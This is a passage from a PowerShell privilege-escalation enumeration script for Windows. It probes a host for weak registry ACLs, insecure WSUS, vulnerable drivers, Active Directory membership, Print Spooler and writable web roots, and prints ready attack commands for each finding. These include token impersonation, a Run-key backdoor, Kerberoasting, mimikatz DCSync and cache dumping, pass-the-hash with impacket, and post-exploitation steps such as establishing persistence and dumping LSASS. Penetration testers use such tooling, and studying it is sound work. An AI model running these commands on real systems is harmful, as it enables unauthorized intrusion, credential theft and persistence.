    Write-Exploit "Already covered in Privilege Analysis section"
}

Write-Info "Additional token manipulation checks:"
Write-Exploit ""
Write-Exploit "=== Tool: Incognito ==="
Write-Exploit "  incognito.exe list_tokens -u"
Write-Exploit "  incognito.exe execute -c 'DOMAIN\admin' cmd.exe"
Write-Exploit ""
Write-Exploit "=== Tool: Invoke-TokenManipulation (PowerSploit) ==="
Write-Exploit "  Import-Module .\Invoke-TokenManipulation.ps1"
Write-Exploit "  Invoke-TokenManipulation -ShowAll"
Write-Exploit "  Invoke-TokenManipulation -ImpersonateUser -Username 'DOMAIN\admin'"
Write-Exploit "  Invoke-TokenManipulation -CreateProcess 'cmd.exe' -Username 'DOMAIN\admin'"
Write-Exploit ""
Write-Exploit "=== Tool: Tokenvator ==="
Write-Exploit "  Tokenvator.exe /list"
Write-Exploit "  Tokenvator.exe /steal /user:DOMAIN\admin /cmd:cmd.exe"

# ============================================================================
# 22. REGISTRY PERSISTENCE CHECK (ENHANCED)
# ============================================================================
Write-Host "`n[====== REGISTRY PERSISTENCE CHECK ======]" -ForegroundColor Yellow

$runKeys = @(
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
)

Write-Info "Checking registry run keys for write permissions..."
foreach ($key in $runKeys) {
    if (Test-Path $key) {
        try {
            $acl = Get-Acl $key
            $writePerms = $acl.Access | Where-Object {
                ($_.RegistryRights -match "WriteKey|FullControl|SetValue") -and 
                ($_.IdentityReference -notmatch "SYSTEM|Administrators|TrustedInstaller")
            }
            
            if ($writePerms) {
                Write-Vuln "Writable registry run key: $key"
                $VulnCount++
                Write-Exploit "Writable by: $($writePerms.IdentityReference -join ', ')"
                Write-Exploit "Exploit: reg add '$key' /v Backdoor /t REG_SZ /d 'C:\path\to\backdoor.exe' /f"
                Write-Exploit "Persistence: Executes on user logon"
            }
        } catch {}
    }
}

# Check other persistence locations
$persistenceKeys = @(
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServices",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce",
    "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows",
    "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit",
    "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
)

foreach ($key in $persistenceKeys) {
    if (Test-Path $key) {
        Write-Info "Persistence location exists: $key"
    }
}

# ============================================================================
# 23. WSUS CONFIGURATION (ENHANCED)
# ============================================================================
Write-Host "`n[====== WSUS CONFIGURATION CHECK ======]" -ForegroundColor Yellow
$wsusServer = Get-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate" -ErrorAction SilentlyContinue
$wsusAU = Get-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate\AU" -ErrorAction SilentlyContinue

if ($wsusServer) {
    if ($wsusServer.WUServer) {
        Write-Info "WSUS Server configured: $($wsusServer.WUServer)"
        
        if ($wsusServer.WUServer -match "^http://" -and $wsusServer.WUServer -notmatch "^https://") {
            Write-Vuln "WSUS using HTTP (not HTTPS) - Man-in-the-Middle possible"
            $VulnCount++
            Write-Exploit "Vulnerable to WSUS MitM attacks"
            Write-Exploit "Tool: WSUSpendu - https://github.com/AlsidOfficial/WSUSpendu"
            Write-Exploit "Tool: WSUSpect Proxy - https://github.com/ctxis/wsuspect-proxy"
            Write-Exploit "Exploit Process:"
            Write-Exploit "  1. Setup MitM (ARP spoofing, DNS spoofing, etc.)"
            Write-Exploit "  2. Intercept WSUS HTTP traffic"
            Write-Exploit "  3. Inject malicious updates"
            Write-Exploit "  4. Achieve SYSTEM via malicious update"
        }
        
        if ($wsusServer.WUStatusServer) {
            Write-Info "WSUS Status Server: $($wsusServer.WUStatusServer)"
        }
    }
    
    if ($wsusAU) {
        Write-Info "WSUS Auto Update Options: $($wsusAU.AUOptions)"
        Write-Info "WSUS Scheduled Install Day: $($wsusAU.ScheduledInstallDay)"
    }
} else {
    Write-Info "WSUS not configured (using Windows Update directly)"
}

# ============================================================================
# 24. VULNERABLE DRIVERS CHECK (ENHANCED)
# ============================================================================
Write-Host "`n[====== VULNERABLE DRIVERS CHECK ======]" -ForegroundColor Yellow
Write-Info "Checking for known vulnerable drivers..."

$drivers = Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer, DriverProviderName

# Known vulnerable drivers that can be exploited for kernel access
$vulnDrivers = @{
    "RTCore64" = @{
        "CVE" = "CVE-2019-16098"
        "Exploit" = "Arbitrary read/write in kernel"
        "Tool" = "https://github.com/Barakat/CVE-2019-16098"
    }
    "CPUZ" = @{
        "CVE" = "Multiple CVEs"
        "Exploit" = "Kernel read/write primitives"
    }
    "GPU-Z" = @{
        "CVE" = "CVE-2017-18344"
        "Exploit" = "Kernel mode arbitrary write"
    }
    "MSI Afterburner" = @{
        "CVE" = "CVE-2019-16098"
        "Exploit" = "Kernel mode driver exploit"
    }
    "ASUS" = @{
        "Exploit" = "Various ASUS drivers vulnerable"
    }
    "Gigabyte" = @{
        "Exploit" = "GIO driver vulnerabilities"
    }
    "EVGA" = @{
        "Exploit" = "Precision X1 driver"
    }
    "dbutil" = @{
        "CVE" = "Multiple"
        "Exploit" = "Dell driver vulnerabilities"
    }
}

foreach ($driver in $drivers) {
    foreach ($vuln in $vulnDrivers.Keys) {
        if ($driver.DeviceName -like "*$vuln*" -or $driver.Manufacturer -like "*$vuln*" -or $driver.DriverProviderName -like "*$vuln*") {
            Write-Vuln "Potentially vulnerable driver: $($driver.DeviceName)"
            $VulnCount++
            $vulnInfo = $vulnDrivers[$vuln]
            Write-Exploit "Driver: $($driver.DeviceName)"
            Write-Exploit "Version: $($driver.DriverVersion)"
            Write-Exploit "Manufacturer: $($driver.Manufacturer)"
            if ($vulnInfo.CVE) {
                Write-Exploit "CVE: $($vulnInfo.CVE)"
            }
            if ($vulnInfo.Exploit) {
                Write-Exploit "Exploit: $($vulnInfo.Exploit)"
            }
            if ($vulnInfo.Tool) {
                Write-Exploit "Tool: $($vulnInfo.Tool)"
            }
            Write-Exploit "Search: GitHub for kernel exploits"
        }
    }
}

# Check for unsigned or test-signed drivers
Write-Info "Checking for unsigned drivers..."
$unsignedDrivers = $drivers | Where-Object {-not $_.IsSigned}
if ($unsignedDrivers) {
    Write-Vuln "Unsigned drivers detected: $($unsignedDrivers.Count)"
    $VulnCount++
    foreach ($driver in $unsignedDrivers | Select-Object -First 5) {
        Write-Exploit "  → $($driver.DeviceName)"
    }
}

# ============================================================================
# 25. ACTIVE DIRECTORY ENUMERATION (ENHANCED)
# ============================================================================
Write-Host "`n[====== ACTIVE DIRECTORY CHECK ======]" -ForegroundColor Yellow

if ($env:USERDNSDOMAIN) {
    Write-Info "Machine is domain-joined: $env:USERDNSDOMAIN"
    Write-Info "Domain Controller: $env:LOGONSERVER"
    Write-Info "User Domain: $env:USERDOMAIN"
    
    Write-Vuln "Domain enumeration opportunities available"
    $VulnCount++
    
    Write-Exploit ""
    Write-Exploit "=== Basic Domain Enumeration ==="
    Write-Exploit "  net user /domain"
    Write-Exploit "  net group /domain"
    Write-Exploit "  net group 'Domain Admins' /domain"
    Write-Exploit "  net group 'Domain Controllers' /domain"
    Write-Exploit "  net group 'Enterprise Admins' /domain"
    Write-Exploit "  net accounts /domain"
    Write-Exploit "  nltest /domain_trusts"
    Write-Exploit "  nltest /dclist:$env:USERDNSDOMAIN"
    
    Write-Exploit ""
    Write-Exploit "=== PowerShell AD Enumeration ==="
    Write-Exploit "  Import-Module ActiveDirectory"
    Write-Exploit "  Get-ADUser -Filter * -Properties *"
    Write-Exploit "  Get-ADGroup -Filter * -Properties *"
    Write-Exploit "  Get-ADComputer -Filter * -Properties *"
    Write-Exploit "  Get-ADDomain"
    Write-Exploit "  Get-ADForest"
    
    Write-Exploit ""
    Write-Exploit "=== PowerView (PowerSploit) ==="
    Write-Exploit "  Import-Module .\PowerView.ps1"
    Write-Exploit "  Get-NetDomain"
    Write-Exploit "  Get-NetDomainController"
    Write-Exploit "  Get-NetUser"
    Write-Exploit "  Get-NetGroup"
    Write-Exploit "  Get-NetComputer"
    Write-Exploit "  Get-NetGPO"
    Write-Exploit "  Find-LocalAdminAccess"
    Write-Exploit "  Invoke-ShareFinder"
    Write-Exploit "  Invoke-UserHunter"
    
    Write-Exploit ""
    Write-Exploit "=== BloodHound ==="
    Write-Exploit "  Import-Module .\SharpHound.ps1"
    Write-Exploit "  Invoke-BloodHound -CollectionMethod All"
    Write-Exploit "  Invoke-BloodHound -CollectionMethod Session,LoggedOn"
    
    Write-Exploit ""
    Write-Exploit "=== Kerberoasting ==="
    Write-Exploit "  Get-NetUser -SPN | select samaccountname,serviceprincipalname"
    Write-Exploit "  Invoke-Kerberoast -OutputFormat Hashcat"
    Write-Exploit "  OR: impacket-GetUserSPNs domain/user:password -dc-ip IP -request"
    
    Write-Exploit ""
    Write-Exploit "=== AS-REP Roasting ==="
    Write-Exploit "  Get-NetUser -PreauthNotRequired"
    Write-Exploit "  impacket-GetNPUsers domain/ -usersfile users.txt -format hashcat"
    
    Write-Exploit ""
    Write-Exploit "=== DCSync Attack (if DA or Replication rights) ==="
    Write-Exploit "  mimikatz 'lsadump::dcsync /user:domain\krbtgt'"
    Write-Exploit "  impacket-secretsdump domain/user:password@dc-ip"
    
} else {
    Write-Info "Machine is not domain-joined (Workgroup)"
    Write-Info "Check for pass-the-hash opportunities to local admin on other hosts"
}

# ============================================================================
# 26. ADDITIONAL PRIVILEGE ESCALATION VECTORS
# ============================================================================
Write-Host "`n[====== ADDITIONAL VECTORS ======]" -ForegroundColor Yellow

# Check for Print Spooler service
Write-Info "Checking Print Spooler service..."
$spooler = Get-Service -Name Spooler -ErrorAction SilentlyContinue
if ($spooler -and $spooler.Status -eq "Running") {
    Write-Vuln "Print Spooler service is running"
    $VulnCount++
    Write-Exploit "Potential for PrintNightmare (CVE-2021-1675, CVE-2021-34527)"
    Write-Exploit "Check patch level for PrintNightmare vulnerability"
    Write-Exploit "Tool: https://github.com/cube0x0/CVE-2021-1675"
}

# Check for unpatched Windows services
Write-Info "Checking for exploitable Windows services..."
$exploitableServices = @{
    "SessionEnv" = "CVE-2018-0952 - Privilege Escalation"
    "IKEEXT" = "CVE-2022-34721 - Privilege Escalation"
}

foreach ($svc in $exploitableServices.Keys) {
    $service = Get-Service -Name $svc -ErrorAction SilentlyContinue
    if ($service) {
        Write-Info "Service $svc is present - check for: $($exploitableServices[$svc])"
    }
}

# Check for cached credentials
Write-Info "Checking for cached credentials..."
$cachedLogons = (Get-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name CachedLogonsCount -ErrorAction SilentlyContinue).CachedLogonsCount
if ($cachedLogons -gt 0) {
    Write-Vuln "Cached credentials configured: $cachedLogons logons"
    $VulnCount++
    Write-Exploit "Cached domain credentials may be crackable"
    Write-Exploit "Tool: Mimikatz 'lsadump::cache'"
}

# Check for LLMNR/NBT-NS
Write-Info "LLMNR/NBT-NS Poisoning opportunities..."
Write-Exploit "If on network with other hosts:"
Write-Exploit "  Tool: Responder"
Write-Exploit "  Tool: Inveigh (PowerShell)"
Write-Exploit "  Capture NTLM hashes via poisoning"

# Check for pass-the-hash opportunities
Write-Info "Pass-the-Hash opportunities..."
Write-Exploit "If you obtain NTLM hashes:"
Write-Exploit "  impacket-psexec -hashes :NTLMHASH user@target"
Write-Exploit "  impacket-wmiexec -hashes :NTLMHASH user@target"
Write-Exploit "  mimikatz 'sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:HASH /run:cmd'"

# ============================================================================
# 27. FILE AND FOLDER PERMISSIONS
# ============================================================================
Write-Host "`n[====== FILE AND FOLDER PERMISSION CHECKS ======]" -ForegroundColor Yellow

# Check common locations for writable files
$checkLocations = @{
    "C:\inetpub\wwwroot" = "IIS webroot"
    "C:\xampp\htdocs" = "XAMPP webroot"
    "C:\wamp\www" = "WAMP webroot"
}

foreach ($location in $checkLocations.Keys) {
    if (Test-Path $location) {
        try {
            $testFile = Join-Path $location "test_$(Get-Random).txt"
            New-Item -Path $testFile -ItemType File -Force -ErrorAction Stop | Out-Null
            Remove-Item $testFile -Force
            
            Write-Vuln "Writable web directory: $location ($($checkLocations[$location]))"
            $VulnCount++
            Write-Exploit "Can upload web shells"
        } catch {}
    }
}

# ============================================================================
# SUMMARY AND RECOMMENDATIONS
# ============================================================================
Write-Host "`n╔═══════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║                        ENUMERATION SUMMARY                        ║" -ForegroundColor Cyan
Write-Host "╚═══════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan

Write-Host "`n[*] Total Potential Vulnerabilities Found: $VulnCount" -ForegroundColor $(if($VulnCount -gt 0){"Yellow"}else{"Green"})

if ($VulnCount -gt 0) {
    Write-Host "`n╔═══════════════════════════════════════════════════════════════════╗" -ForegroundColor Yellow
    Write-Host "║                     RECOMMENDED NEXT STEPS                        ║" -ForegroundColor Yellow
    Write-Host "╚═══════════════════════════════════════════════════════════════════╝" -ForegroundColor Yellow
    
    Write-Host "`n[1] PRIORITIZATION:" -ForegroundColor White
    Write-Host "    → Review all [!] EXPLOITABLE findings above" -ForegroundColor Gray
    Write-Host "    → Focus on quick wins (AlwaysInstallElevated, unquoted paths, weak ACLs)" -ForegroundColor Gray
    Write-Host "    → Then attempt privilege-based exploits (SeImpersonate, etc.)" -ForegroundColor Gray
    Write-Host "    → Finally try kernel exploits (most risky)" -ForegroundColor Gray
    
    Write-Host "`n[2] AUTOMATED TOOLS:" -ForegroundColor White
    Write-Host "    → WinPEAS: https://github.com/carlospolop/PEASS-ng/releases" -ForegroundColor Gray
    Write-Host "    → PrivescCheck: https://github.com/itm4n/PrivescCheck" -ForegroundColor Gray
    Write-Host "    → PowerUp: https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" -ForegroundColor Gray
    Write-Host "    → Sherlock: https://github.com/rasta-mouse/Sherlock" -ForegroundColor Gray
    Write-Host "    → Watson: https://github.com/rasta-mouse/Watson" -ForegroundColor Gray
    Write-Host "    → Seatbelt: https://github.com/GhostPack/Seatbelt" -ForegroundColor Gray
    
    Write-Host "`n[3] EXPLOITATION TOOLS:" -ForegroundColor White
    Write-Host "    → Potato Exploits: JuicyPotato, RoguePotato, PrintSpoofer, GodPotato" -ForegroundColor Gray
    Write-Host "    → Credential Harvesting: Mimikatz, LaZagne, SharpChrome" -ForegroundColor Gray
    Write-Host "    → UAC Bypass: UACME" -ForegroundColor Gray
    Write-Host "    → Token Manipulation: Incognito, Invoke-TokenManipulation" -ForegroundColor Gray
    
    Write-Host "`n[4] POST-EXPLOITATION:" -ForegroundColor White
    Write-Host "    → Establish persistence" -ForegroundColor Gray
    Write-Host "    → Dump credentials (LSASS, SAM, LSA Secrets)" -ForegroundColor Gray
    Write-Host "    → Lateral movement preparation" -ForegroundColor Gray
    Write-Host "    → Document all findings" -ForegroundColor Gray
    
    Write-Host "`n[5] CAUTION:" -ForegroundColor Red
    Write-Host "    ⚠ Always get proper authorization before exploitation" -ForegroundColor Red
    Write-Host "    ⚠ Test kernel exploits carefully (can cause BSOD)" -ForegroundColor Red
    Write-Host "    ⚠ Document all actions for reporting" -ForegroundColor Red
    Write-Host "    ⚠ Have a rollback plan" -ForegroundColor Red
    
} else {
    Write-Host "`n[+] No obvious vulnerabilities detected" -ForegroundColor Green
    Write-Host "    → Run automated tools for deeper analysis" -ForegroundColor White
    Write-Host "    → Check for misconfigurations in specific applications" -ForegroundColor White
    Write-Host "    → Review domain-level privileges if domain-joined" -ForegroundColor White
    Write-Host "    → Consider social engineering vectors" -ForegroundColor White
}

Write-Host "`n[*] Enumeration completed at $(Get-Date)" -ForegroundColor Cyan
Write-Host "[*] Save output for review: | Tee-Object -FilePath priv_enum_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt" -ForegroundColor Cyan
Write-Host ""
